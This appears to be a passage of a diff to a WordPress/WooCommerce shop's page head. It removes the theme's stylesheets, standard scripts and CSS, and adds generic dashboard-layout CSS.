linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
-:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
-:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
-:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
-</style>
-<style id='woocommerce-inline-inline-css' type='text/css'>
-.woocommerce form .form-row .required { visibility: visible; }
-</style>
-<link rel='stylesheet' id='wt-woocommerce-related-products-css' href='https://bolsomadrid.com/wp-content/plugins/wt-woocommerce-related-products/public/css/custom-related-products-public.css?ver=1.7.3' type='text/css' media='all' />
-<link rel='stylesheet' id='carousel-css-css' href='https://bolsomadrid.com/wp-content/plugins/wt-woocommerce-related-products/public/css/owl.carousel.min.css?ver=1.7.3' type='text/css' media='all' />
-<link rel='stylesheet' id='carousel-theme-css-css' href='https://bolsomadrid.com/wp-content/plugins/wt-woocommerce-related-products/public/css/owl.theme.default.min.css?ver=1.7.3' type='text/css' media='all' />
-<link rel='stylesheet' id='yith_wcbm_badge_style-css' href='https://bolsomadrid.com/wp-content/plugins/yith-woocommerce-badge-management-premium/assets/css/frontend.css?ver=3.4.0' type='text/css' media='all' />
-<style id='yith_wcbm_badge_style-inline-css' type='text/css'>
-.yith-wcbm-badge.yith-wcbm-badge-advanced.yith-wcbm-badge-27600 {
-				top: 0; left: 0; 
-				opacity: 100%;
-				
-				margin: 0px 0px 0px 0px;
-				padding: 0px 0px 0px 0px;
-				
-			}
-</style>
-<link rel='stylesheet' id='yith-gfont-open-sans-css' href='https://bolsomadrid.com/wp-content/plugins/yith-woocommerce-badge-management-premium/assets/fonts/open-sans/style.css?ver=3.4.0' type='text/css' media='all' />
-<link rel='stylesheet' id='brands-styles-css' href='https://bolsomadrid.com/wp-content/plugins/woocommerce/assets/css/brands.css?ver=10.1.1' type='text/css' media='all' />
-<link rel='stylesheet' id='ywdpd_owl-css' href='https://bolsomadrid.com/wp-content/plugins/yith-woocommerce-dynamic-pricing-and-discounts-premium/assets/css/owl/owl.carousel.min.css?ver=3.5.0' type='text/css' media='all' />
-<link rel='stylesheet' id='yith_ywdpd_frontend-css' href='https://bolsomadrid.com/wp-content/plugins/yith-woocommerce-dynamic-pricing-and-discounts-premium/assets/css/frontend.css?ver=3.5.0' type='text/css' media='all' />
-<link rel='stylesheet' id='bootstrap-css' href='https://bolsomadrid.com/wp-content/themes/basel/css/bootstrap.min.css?ver=5.9.0' type='text/css' media='all' />
-<link rel='stylesheet' id='basel-style-css' href='https://bolsomadrid.com/wp-content/themes/basel/css/parts/base.min.css?ver=5.9.0' type='text/css' media='all' />
-<link rel='stylesheet' id='basel-wp-gutenberg-css' href='https://bolsomadrid.com/wp-content/themes/basel/css/parts/wp-gutenberg.min.css?ver=5.9.0' type='text/css' media='all' />
-<link rel='stylesheet' id='basel-opt-lazy-loading-css' href='https://bolsomadrid.com/wp-content/themes/basel/css/parts/opt-lazy-loading.min.css?ver=5.9.0' type='text/css' media='all' />
-<link rel='stylesheet' id='basel-int-wpcf7-css' href='https://bolsomadrid.com/wp-content/themes/basel/css/parts/int-wpcf7.min.css?ver=5.9.0' type='text/css' media='all' />
-<link rel='stylesheet' id='basel-woo-base-css' href='https://bolsomadrid.com/wp-content/themes/basel/css/parts/woo-base.min.css?ver=5.9.0' type='text/css' media='all' />
-<link rel='stylesheet' id='basel-header-top-bar-css' href='https://bolsomadrid.com/wp-content/themes/basel/css/parts/header-top-bar.min.css?ver=5.9.0' type='text/css' media='all' />
-<link rel='stylesheet' id='basel-header-general-css' href='https://bolsomadrid.com/wp-content/themes/basel/css/parts/header-general.min.css?ver=5.9.0' type='text/css' media='all' />
-<link rel='stylesheet' id='basel-page-title-css' href='https://bolsomadrid.com/wp-content/themes/basel/css/parts/page-title.min.css?ver=5.9.0' type='text/css' media='all' />
-<link rel='stylesheet' id='basel-footer-general-css' href='https://bolsomadrid.com/wp-content/themes/basel/css/parts/footer-general.min.css?ver=5.9.0' type='text/css' media='all' />
-<link rel='stylesheet' id='basel-lib-photoswipe-css' href='https://bolsomadrid.com/wp-content/themes/basel/css/parts/lib-photoswipe.min.css?ver=5.9.0' type='text/css' media='all' />
-<link rel='stylesheet' id='basel-opt-scrolltotop-css' href='https://bolsomadrid.com/wp-content/themes/basel/css/parts/opt-scrolltotop.min.css?ver=5.9.0' type='text/css' media='all' />
-<link rel='stylesheet' id='xts-google-fonts-css' href='//fonts.googleapis.com/css?family=Karla%3A200%2C300%2C400%2C500%2C600%2C700%2C800%2C200italic%2C300italic%2C400italic%2C500italic%2C600italic%2C700italic%2C800italic%7CLora%3A400%2C500%2C600%2C700%2C400italic%2C500italic%2C600italic%2C700italic%7CLato%3A100%2C100italic%2C300%2C300italic%2C400%2C400italic%2C700%2C700italic%2C900%2C900italic&#038;ver=5.9.0' type='text/css' media='all' />
-<script type="text/template" id="tmpl-variation-template">
-	<div class="woocommerce-variation-description wc-catalog-visibility">
-		{{{ data.variation.variation_description }}}
-	</div>
-
-	<div class="woocommerce-variation-availability wc-catalog-visiblity">
-		{{{ data.variation.availability_html }}}
-	</div>
-</script>
-<script type="text/template" id="tmpl-unavailable-variation-template">
-	<p>Lo siento, este producto no está disponible. Por favor, elige otra combinación.</p>
-</script><script type="text/javascript" src="https://bolsomadrid.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/plugins/woocommerce/assets/js/jquery-blockui/jquery.blockUI.min.js?ver=2.7.0-wc.10.1.1" id="jquery-blockui-js" defer="defer" data-wp-strategy="defer"></script>
-<script type="text/javascript" id="wc-add-to-cart-js-extra">
-/* <![CDATA[ */
-var wc_add_to_cart_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","i18n_view_cart":"Ver carrito","cart_url":"https:\/\/bolsomadrid.com\/carrito","is_cart":"","cart_redirect_after_add":"no"};
-/* ]]> */
-</script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart.min.js?ver=10.1.1" id="wc-add-to-cart-js" defer="defer" data-wp-strategy="defer"></script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/plugins/woocommerce/assets/js/js-cookie/js.cookie.min.js?ver=2.1.4-wc.10.1.1" id="js-cookie-js" data-wp-strategy="defer"></script>
-<script type="text/javascript" id="woocommerce-js-extra">
-/* <![CDATA[ */
-var woocommerce_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","i18n_password_show":"Mostrar contrase\u00f1a","i18n_password_hide":"Ocultar contrase\u00f1a"};
-/* ]]> */
-</script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/plugins/woocommerce/assets/js/frontend/woocommerce.min.js?ver=10.1.1" id="woocommerce-js" defer="defer" data-wp-strategy="defer"></script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/plugins/wt-woocommerce-related-products/public/js/custom-related-products-public.js?ver=1.7.3" id="wt-woocommerce-related-products-js"></script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/plugins/wt-woocommerce-related-products/public/js/wt_owl_carousel.js?ver=1.7.3" id="wt-owl-js-js"></script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-includes/js/underscore.min.js?ver=1.13.7" id="underscore-js"></script>
-<script type="text/javascript" id="wp-util-js-extra">
-/* <![CDATA[ */
-var _wpUtilSettings = {"ajax":{"url":"\/wp-admin\/admin-ajax.php"}};
-/* ]]> */
-</script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-includes/js/wp-util.min.js?ver=6.8.2" id="wp-util-js"></script>
-<script type="text/javascript" id="wc-add-to-cart-variation-js-extra">
-/* <![CDATA[ */
-var wc_add_to_cart_variation_params = {"wc_ajax_url":"\/?wc-ajax=%%endpoint%%","i18n_no_matching_variations_text":"Lo siento, no hay productos que igualen tu selecci\u00f3n. Por favor, escoge una combinaci\u00f3n diferente.","i18n_make_a_selection_text":"Elige las opciones del producto antes de a\u00f1adir este producto a tu carrito.","i18n_unavailable_text":"Lo siento, este producto no est\u00e1 disponible. Por favor, elige otra combinaci\u00f3n.","i18n_reset_alert_text":"Se ha restablecido tu selecci\u00f3n. Por favor, elige alguna opci\u00f3n del producto antes de poder a\u00f1adir este producto a tu carrito."};
-/* ]]> */
-</script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart-variation.min.js?ver=10.1.1" id="wc-add-to-cart-variation-js" defer="defer" data-wp-strategy="defer"></script>
-<!--[if lt IE 9]>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/themes/basel/js/html5.min.js?ver=5.9.0" id="basel_html5shiv-js"></script>
-<![endif]-->
-<link rel="https://api.w.org/" href="https://bolsomadrid.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://bolsomadrid.com/wp-json/wp/v2/pages/1529" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://bolsomadrid.com/xmlrpc.php?rsd" />
-<meta name="generator" content="WordPress 6.8.2" />
-<meta name="generator" content="WooCommerce 10.1.1" />
-<link rel='shortlink' href='https://bolsomadrid.com/?p=1529' />
-<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://bolsomadrid.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fbolsomadrid.com%2Fcontacto" />
-<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://bolsomadrid.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fbolsomadrid.com%2Fcontacto&#038;format=xml" />
-<meta name="generator" content="Redux 4.5.7" /><meta name="theme-color" content="">		
-		
-		
-							<link rel="shortcut icon" href="https://bolsomadrid.com/wp-content/themes/basel/images/icons/favicon.png">
-			<link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://bolsomadrid.com/wp-content/themes/basel/images/icons/apple-touch-icon-152x152-precomposed.png">
-		        <style> 
-            	
-			/* Shop popup */
-			
-			.basel-promo-popup {
-			   max-width: 900px;
-			}
-	
-            .site-logo {
-                width: 20%;
-            }    
-
-            .site-logo img {
-                max-width: 200px;
-                max-height: 90px;
-            }    
-
-                            .right-column {
-                    width: 401px;
-                }  
-            
-                            .basel-woocommerce-layered-nav .basel-scroll-content {
-                    max-height: 280px;
-                }
-            
-			/* header Banner */
-			body .header-banner {
-				height: 40px;
-			}
-	
-			body.header-banner-display .website-wrapper {
-				margin-top:40px;
-			}	
-
-            /* Topbar height configs */
-
-			.topbar-menu ul > li {
-				line-height: 55px;
-			}
-			
-			.topbar-wrapp,
-			.topbar-content:before {
-				height: 55px;
-			}
-			
-			.sticky-header-prepared.basel-top-bar-on .header-shop, 
-			.sticky-header-prepared.basel-top-bar-on .header-split,
-			.enable-sticky-header.basel-header-overlap.basel-top-bar-on .main-header {
-				top: 55px;
-			}
-
-            /* Header height configs */
-
-            /* Limit logo image height for according to header height */
-            .site-logo img {
-                max-height: 90px;
-            } 
-
-            /* And for sticky header logo also */
-            .act-scroll .site-logo img,
-            .header-clone .site-logo img {
-                max-height: 75px;
-            }   
-
-            /* Set sticky headers height for cloned headers based on menu links line height */
-            .header-clone .main-nav .menu > li > a {
-                height: 75px;
-                line-height: 75px;
-            } 
-
-            /* Height for switch logos */
-
-            .sticky-header-real:not(.global-header-menu-top) .switch-logo-enable .basel-logo {
-                height: 90px;
-            }
-
-            .sticky-header-real:not(.global-header-menu-top) .act-scroll .switch-logo-enable .basel-logo {
-                height: 75px;
-            }
-
-            .sticky-header-real:not(.global-header-menu-top) .act-scroll .switch-logo-enable {
-                transform: translateY(-75px);
-            }
-
-                            /* Header height for these layouts based on it's menu links line height */
-                .main-nav .menu > li > a {
-                    height: 90px;
-                    line-height: 90px;
-                }  
-                /* The same for sticky header */
-                .act-scroll .main-nav .menu > li > a {
-                    height: 75px;
-                    line-height: 75px;
-                }  
-            
-            
-            
-            
-            /* Page headings settings for heading overlap. Calculate on the header height base */
-
-            .basel-header-overlap .title-size-default,
-            .basel-header-overlap .title-size-small,
-            .basel-header-overlap .title-shop.without-title.title-size-default,
-            .basel-header-overlap .title-shop.without-title.title-size-small {
-                padding-top: 130px;
-            }
-
-
-            .basel-header-overlap .title-shop.without-title.title-size-large,
-            .basel-header-overlap .title-size-large {
-                padding-top: 210px;
-            }
-
-            @media (max-width: 991px) {
-
-				/* header Banner */
-				body .header-banner {
-					height: 40px;
-				}
-	
-				body.header-banner-display .website-wrapper {
-					margin-top:40px;
-				}
-
-	            /* Topbar height configs */
-				.topbar-menu ul > li {
-					line-height: 100px;
-				}
-				
-				.topbar-wrapp,
-				.topbar-content:before {
-					height: 100px;
-				}
-				
-				.sticky-header-prepared.basel-top-bar-on .header-shop, 
-				.sticky-header-prepared.basel-top-bar-on .header-split,
-				.enable-sticky-header.basel-header-overlap.basel-top-bar-on .main-header {
-					top: 100px;
-				}
-
-                /* Set header height for mobile devices */
-                .main-header .wrapp-header {
-                    min-height: 60px;
-                } 
-
-                /* Limit logo image height for mobile according to mobile header height */
-                .site-logo img {
-                    max-height: 60px;
-                }   
-
-                /* Limit logo on sticky header. Both header real and header cloned */
-                .act-scroll .site-logo img,
-                .header-clone .site-logo img {
-                    max-height: 60px;
-                }
-
-                /* Height for switch logos */
-
-                .main-header .switch-logo-enable .basel-logo {
-                    height: 60px;
-                }
-
-                .sticky-header-real:not(.global-header-menu-top) .act-scroll .switch-logo-enable .basel-logo {
-                    height: 60px;
-                }
-
-                .sticky-header-real:not(.global-header-menu-top) .act-scroll .switch-logo-enable {
-                    transform: translateY(-60px);
-                }
-
-                /* Page headings settings for heading overlap. Calculate on the MOBILE header height base */
-                .basel-header-overlap .title-size-default,
-                .basel-header-overlap .title-size-small,
-                .basel-header-overlap .title-shop.without-title.title-size-default,
-                .basel-header-overlap .title-shop.without-title.title-size-small {
-                    padding-top: 80px;
-                }
-
-                .basel-header-overlap .title-shop.without-title.title-size-large,
-                .basel-header-overlap .title-size-large {
-                    padding-top: 120px;
-                }
- 
-            }
-
-                 
-                    </style>
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+        }
         
+        body { 
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: var(--text-primary);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            font-size: 14px;
+            min-height: 100vh;
+        }
         
-			<noscript><style>.woocommerce-product-gallery{ opacity: 1 !important; }</style></noscript>
-	<meta name="generator" content="Elementor 3.31.2; features: e_font_icon_svg, additional_custom_breakpoints, e_element_cache; settings: css_print_method-external, google_font-enabled, font_display-swap">
-			<style>
-				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload),
-				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload) * {
-					background-image: none !important;
-				}
-				@media screen and (max-height: 1024px) {
-					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload),
-					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload) * {
-						background-image: none !important;
-					}
-				}
-				@media screen and (max-height: 640px) {
-					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload),
-					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload) * {
-						background-image: none !important;
-					}
-				}
-			</style>
-			<style data-type="basel-dynamic-css">.page-title-default{background-color:#212121;}.topbar-wrapp{background-color:#e6b38f;}.main-header{border-color:#3d3d3d;border-style:solid;}.footer-container{background-color:#000000;}body, p, .widget_nav_mega_menu .menu > li > a, 
-.mega-navigation .menu > li > a,
-.basel-navigation .menu > li.menu-item-design-full-width .sub-sub-menu li a, 
-.basel-navigation .menu > li.menu-item-design-sized .sub-sub-menu li a,
-.basel-navigation .menu > li.menu-item-design-default .sub-menu li a,
-.font-default
-		{font-family: "Karla", Arial, Helvetica, sans-serif;}h1 a, h2 a, h3 a, h4 a, h5 a, h6 a, h1, h2, h3, h4, h5, h6, .title, table th,
-.wc-tabs li a,
-.masonry-filter li a,
-.woocommerce .cart-empty,
-.basel-navigation .menu > li.menu-item-design-full-width .sub-menu > li > a, 
-.basel-navigation .menu > li.menu-item-design-sized .sub-menu > li > a,
-.mega-menu-list > li > a,
-fieldset legend,
-table th,
-.basel-empty-compare,
-.compare-field,
-.compare-value:before,
-.color-scheme-dark .info-box-inner h1,
-.color-scheme-dark .info-box-inner h2,
-.color-scheme-dark .info-box-inner h3,
-.color-scheme-dark .info-box-inner h4,
-.color-scheme-dark .info-box-inner h5,
-.color-scheme-dark .info-box-inner h6
+        .container { 
+            display: flex; 
+            min-height: 100vh; 
+        }
+        
+        .sidebar { 
+            width: 280px;
+            background: var(--sidebar-bg);
+            padding: 20px;
+            position: sticky;
+            top: 0;
+            align-self: flex-start;
+            height: 100vh;
+            overflow-y: auto;
+            box-shadow: var(--shadow);
+            z-index: 100;
+        }
+        
+        .main { 
+            flex: 1; 
+            padding: 25px; 
+            background: transparent;
+            overflow-y: auto;
+        }
+        
+        .header {
+            background: var(--card-bg);
+            padding: 20px; 
+            margin-bottom: 25px; 
+            border-radius: 10px;
+            color: var(--text-primary);
+            border: none;
+            box-shadow: var(--shadow);
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, var(--secondary), var(--accent));
+        }
+        
+        .header h1 {
+            margin: 0;
+            font-size: 28px;
+        }
 
-		{font-family: "Karla", Arial, Helvetica, sans-serif;}
+        .header-icons {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
 
-.product-title a,
-.post-slide .entry-title a,
-.category-grid-item .hover-mask h3,
-.basel-search-full-screen .basel-search-inner input[type="text"],
-.blog-post-loop .entry-title,
-.post-title-large-image .entry-title,
-.single-product-content .entry-title,
-.basel-entities-title
-		{font-family: "Lora", Arial, Helvetica, sans-serif;}.title-alt, .subtitle, .font-alt, .basel-entry-meta{font-family: "Lato", Arial, Helvetica, sans-serif;}.color-primary,.mobile-nav ul li.current-menu-item > a,.main-nav .menu > li.current-menu-item > a,.main-nav .menu > li.onepage-link.current-menu-item > a,.main-nav .menu > li > a:hover,.basel-navigation .menu>li.menu-item-design-default ul li:hover>a,.basel-navigation .menu > li.menu-item-design-full-width .sub-menu li a:hover, .basel-navigation .menu > li.menu-item-design-sized .sub-menu li a:hover,.basel-product-categories.responsive-cateogires li.current-cat > a, .basel-product-categories.responsive-cateogires li.current-cat-parent > a,.basel-product-categories.responsive-cateogires li.current-cat-ancestor > a,.basel-my-account-links a:hover:before,.mega-menu-list > li > a:hover,.mega-menu-list .sub-sub-menu li a:hover,a[href^=tel],.topbar-menu ul > li > .sub-menu-dropdown li > a:hover,.btn.btn-color-primary.btn-style-bordered,.button.btn-color-primary.btn-style-bordered,button.btn-color-primary.btn-style-bordered,.added_to_cart.btn-color-primary.btn-style-bordered,input[type=submit].btn-color-primary.btn-style-bordered,a.login-to-prices-msg,a.login-to-prices-msg:hover,.basel-dark .single-product-content .entry-summary .yith-wcwl-add-to-wishlist .yith-wcwl-wishlistaddedbrowse a:before, .basel-dark .single-product-content .entry-summary .yith-wcwl-add-to-wishlist .yith-wcwl-wishlistexistsbrowse a:before,.basel-dark .read-more-section .btn-read-more,.basel-dark .basel-load-more,.basel-dark .color-primary,.basel-hover-link .swap-elements .btn-add a,.basel-hover-link .swap-elements .btn-add a:hover,.blog-post-loop .entry-title a:hover,.blog-post-loop.sticky .entry-title:before,.post-slide .entry-title a:hover,.comments-area .reply a,.single-post-navigation a:hover,blockquote footer:before,blockquote cite,.format-quote .entry-content blockquote cite, .format-quote .entry-content blockquote cite a,.basel-entry-meta .meta-author a,.search-no-results.woocommerce .site-content:before,.search-no-results .not-found .entry-header:before,.login-form-footer .lost_password:hover,.error404 .page-title,.menu-label-new:after,.widget_shopping_cart .product_list_widget li .quantity .amount,.product_list_widget li ins .amount,.price ins > .amount,.price ins,.single-product .price,.single-product .price .amount,.popup-quick-view .price,.popup-quick-view .price .amount,.basel-products-nav .product-short .price,.basel-products-nav .product-short .price .amount,.star-rating span:before,.comment-respond .stars a:hover:after,.comment-respond .stars a.active:after,.single-product-content .comment-form .stars span a:hover,.single-product-content .comment-form .stars span a.active,.tabs-layout-accordion .basel-tab-wrapper .basel-accordion-title:hover,.tabs-layout-accordion .basel-tab-wrapper .basel-accordion-title.active,.single-product-content .woocommerce-product-details__short-description ul > li:before, .single-product-content #tab-description ul > li:before, .blog-post-loop .entry-content ul > li:before, .comments-area .comment-list li ul > li:before,.brands-list .brand-item a:hover,.footer-container .footer-widget-collapse.footer-widget-opened .widget-title:after,.sidebar-widget li a:hover, .filter-widget li a:hover,.sidebar-widget li > ul li a:hover, .filter-widget li > ul li a:hover,.basel-price-filter ul li a:hover .amount,.basel-hover-effect-4 .swap-elements > a,.basel-hover-effect-4 .swap-elements > a:hover,.product-grid-item .basel-product-cats a:hover, .product-grid-item .basel-product-brands-links a:hover,.wishlist_table tr td.product-price ins .amount,.basel-buttons .product-compare-button > a.added:before,.basel-buttons .basel-wishlist-btn > a.added:before,.single-product-content .entry-summary .yith-wcwl-add-to-wishlist a:hover,.single-product-content .container .entry-summary .yith-wcwl-add-to-wishlist a:hover:before,.single-product-content .entry-summary .yith-wcwl-add-to-wishlist .yith-wcwl-wishlistaddedbrowse a:before, .single-product-content .entry-summary .yith-wcwl-add-to-wishlist .yith-wcwl-wishlistexistsbrowse a:before,.single-product-content .entry-summary .yith-wcwl-add-to-wishlist .yith-wcwl-add-button.feid-in > a:before,.basel-sticky-btn .basel-sticky-btn-wishlist a.added, .basel-sticky-btn .basel-sticky-btn-wishlist a:hover,.single-product-content .entry-summary .wishlist-btn-wrapper a:hover,.single-product-content .entry-summary .wishlist-btn-wrapper a:hover:before,.single-product-content .entry-summary .wishlist-btn-wrapper a.added:before,.vendors-list ul li a:hover,.product-list-item .product-list-buttons .basel-wishlist-btn a:hover,.product-list-item .product-list-buttons .product-compare-button a:hover,.product-list-item .product-list-buttons .basel-wishlist-btn > a.added:before,.product-list-item .product-list-buttons .product-compare-button > a.added:before,.basel-sticky-btn .basel-sticky-btn-compare a.added, .basel-sticky-btn .basel-sticky-btn-compare a:hover,.single-product-content .entry-summary .compare-btn-wrapper a:hover,.single-product-content .entry-summary .compare-btn-wrapper a:hover:before,.single-product-content .entry-summary .compare-btn-wrapper a.added:before,.single-product-content .entry-summary .basel-sizeguide-btn:hover,.single-product-content .entry-summary .basel-sizeguide-btn:hover:before,.blog-post-loop .entry-content ul li:before,.basel-menu-price .menu-price-price,.basel-menu-price.cursor-pointer:hover .menu-price-title,.comments-area #cancel-comment-reply-link:hover,.comments-area .comment-body .comment-edit-link:hover,.popup-quick-view .entry-summary .entry-title a:hover,.wpb_text_column ul:not(.social-icons) > li:before,.widget_product_categories .basel-cats-toggle:hover,.widget_product_categories .toggle-active,.widget_product_categories li.current-cat-parent > a, .widget_product_categories li.current-cat > a,.woocommerce-checkout-review-order-table tfoot .order-total td .amount,.widget_shopping_cart .product_list_widget li .remove:hover,.basel-active-filters .widget_layered_nav_filters ul li a .amount,.title-wrapper.basel-title-color-primary .title-subtitle,.widget_shopping_cart 